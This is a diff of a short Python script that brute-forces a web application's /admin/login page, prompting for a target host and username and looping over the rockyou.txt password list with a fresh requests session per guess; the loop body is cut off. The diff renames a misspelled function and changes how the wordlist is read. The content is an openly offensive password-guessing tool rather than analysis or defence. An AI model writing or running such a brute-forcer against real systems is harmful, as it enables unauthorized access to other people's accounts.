@@ -2,15 +2,16 @@
 
 import re
 import requests
-#from __future__ import print_function
+#from future import print_function
 
-def open_ressources(file_path):
-  return [item.replace("\n", "") for item in open(file_path).readlines()]
+def open_resources(file_path):
+  with open(file_path, "rb") as f:
+    return [item.decode('iso-8859-1').replace("\n", "") for item in f]
   
 host = input("Enter host to bruteforce: ")
 login_url = 'http://' +host + '/admin/login'   
 username = input("Enter the user name: ")
-wordlist = open_resources("/usr/share/wordlists/rockyou.txt")  
+wordlist = open_resources("rockyou.txt")  
 
 for password in wordlist:
   session = requests.Session()
